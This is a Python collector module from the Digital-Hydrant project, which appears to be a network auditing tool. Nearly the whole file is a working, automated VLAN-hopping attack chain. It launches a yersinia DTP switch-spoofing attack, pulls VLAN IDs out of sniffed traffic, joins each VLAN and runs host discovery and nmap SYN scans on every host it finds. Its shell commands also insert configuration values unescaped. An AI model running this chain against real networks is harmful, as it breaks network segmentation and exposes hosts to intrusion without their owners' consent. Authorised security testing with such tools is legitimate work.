# Copyright 2021 Outside Open
# This file is part of Digital-Hydrant.

# Digital-Hydrant is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# Digital-Hydrant is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with Digital-Hydrant.  If not, see https://www.gnu.org/licenses/.

import time
from datetime import datetime

import netifaces

# import collector module from parent directory
from digital_hydrant.collectors.collector import Collector
from digital_hydrant.config import config as conf


class Vlan(Collector):
    def __init__(self, name):
        super(Vlan, self).__init__(name)

    def run(self):
        CDPSEC = 90

        # verify that the user supplied interface is available
        ifaces = netifaces.interfaces()
        iface = conf.get(self.name, "interface")
        if iface not in ifaces:
            self.logger.error(f"Interface {iface} not available, exiting...")
            # exit()
        else:
            self.logger.debug(f"Interface {iface} found")

        # verify that CDP is enabled
        self.logger.debug(
            f"Sniffing CDP Packets on interface {iface}, waiting {CDPSEC} seconds"
        )

        timestamp = datetime.timestamp(datetime.now()) * 1000
        command = f"""tshark -a duration:{CDPSEC} -i {iface} -Y "cdp" -V 2>&1 | sort --unique"""
        output = self.execute(command)

        payload = self.__parse_output__(output, iface)

        self.queue.put(
            **{"type": self.name, "payload": payload, "timestamp": timestamp}
        )

    def __parse_output__(self, output, iface):
        DTPWAIT = 20
        TAGSEC = 90
        VLANWAIT = 10

        output = output.split("\n")
        for line in output:
            if "0 packets captured" in line:
                # exit if CDP was not found
                self.logger.error("CDP is not enabled on the switch, exiting...")
                # exit()
        self.logger.debug("CDP is enabled on the switch")

        # start yersinia exploit
        self.logger.debug(
            f"Starting attack on interface {iface}, waiting {DTPWAIT} seconds"
        )
        command = f"yersinia dtp -attack 1 -interface {iface}"
        self.logger.debug(f"Executing {command}")
        self.execute(command)
        time.sleep(DTPWAIT)

        # discover vlans
        self.logger.debug(
            f"Extracting VLAN IDs on interface {iface}, sniffing 802.1Q tagged packets for {TAGSEC} seconds"
        )
        command = """tshark -a duration:$TAGSEC -i $INT -Y "vlan" -x -V 2>&1 | grep -o " = ID: .*" | awk '{ print $NF }' | sort --unique"""
        command = command.replace("$TAGSEC", str(TAGSEC))
        command = command.replace("$INT", iface)
        vlan_ids = self.execute(command)
        if not vlan_ids:
            self.logger.error("No vlan found, exiting...")
            # exit()
        self.logger.debug("Vlan(s) found")
        vlan_ids = vlan_ids.split("\n")
        vlan_ids = [string for string in vlan_ids if string != ""]

        # scan vlans for hosts
        for vlan in vlan_ids:
            self.logger.debug(
                f"Adding vlan {vlan} to interface {iface}, waiting {VLANWAIT} seconds"
            )
            command = f"vconfig add {iface} {vlan} 2>&1"
            null = self.execute(command)
            time.sleep(VLANWAIT)

            self.logger.debug(
                f"Scanning for hosts on vlan {vlan}, with interface {iface+'.'+vlan}"
            )
            command = f"netdiscover -N -P -i {iface}.{vlan}"
            scan_results = self.execute(command)
            if scan_results:
                self.logger.debug(f"Host(s) discovered on vlan {vlan}")
            else:
                self.logger.debug(f"No hosts discovered on vlan {vlan}")

            output = scan_results.split("\n")

            simplified_output = []
            for i in output:
                temp_arr = []
                i = i.split(" ")
                for ii in i:
                    if ii != "":
                        temp_arr.append(ii)
                simplified_output.append(temp_arr)
            simplified_output.remove([])

            for i in simplified_output:
                parsed_output = {}

                # IP Adress
                ip = i[0]
                parsed_output["ip"] = ip

                # MAC Address
                mac_address = i[1]
                parsed_output["mac"] = mac_address

                # VLAN
                parsed_output["vlan"] = vlan

                # Hostname
                name = ""
                max_index = len(i)
                for ii in range(4, max_index):
                    name += i[ii] + " "
                if name != "":
                    name = name[:-1]
                parsed_output["host_information"] = name

                # NMAP Port Scan
                self.logger.debug(f"Scanning for open ports on vlan {vlan}, IP {ip}")
                command = f"nmap -e {iface}.{vlan} -sS {ip}"
                output = self.execute(command)
                output = output.replace("\n", " ")
                parsed_output["nmap_scan"] = output

                self.insert_database(parsed_output)

            self.logger.debug(
                f"Removing vlan {vlan} from interface {iface}, waiting {VLANWAIT} seconds"
            )
            command = f"vconfig rem {iface+'.'+vlan} 2>&1"
            null = self.execute(command)
            time.sleep(VLANWAIT)
